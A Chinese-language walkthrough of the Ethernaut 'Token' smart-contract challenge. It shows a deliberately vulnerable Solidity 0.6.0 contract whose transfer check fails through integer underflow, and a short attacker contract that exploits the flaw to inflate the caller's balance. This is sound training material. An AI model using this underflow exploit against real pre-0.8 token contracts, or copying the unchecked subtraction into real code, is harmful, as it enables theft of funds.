# Ethernaut 05-Token

## 本关目标

- 使用初始的 20Token，获得更多的 Token

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // 注意合约使用的solidity版本又是6.0

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  // 向某个地址转移资产
  function transfer(address _to, uint _value) public returns (bool) {
    // 0.6.0版本没有溢出检查，如果msg.sender的balance为0，那么减去比如1，就会溢出得到一个大值，这个判断本质并没有什么作用
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## 解决方案

1. 通过 Hack 合约调用 Token 合约的 transfer()，向自己账户转移 1

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IToken{
    function transfer(address _to, uint _value) external returns (bool);

  function balanceOf(address _owner) external view returns (uint);

}

contract Hack {
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}
```
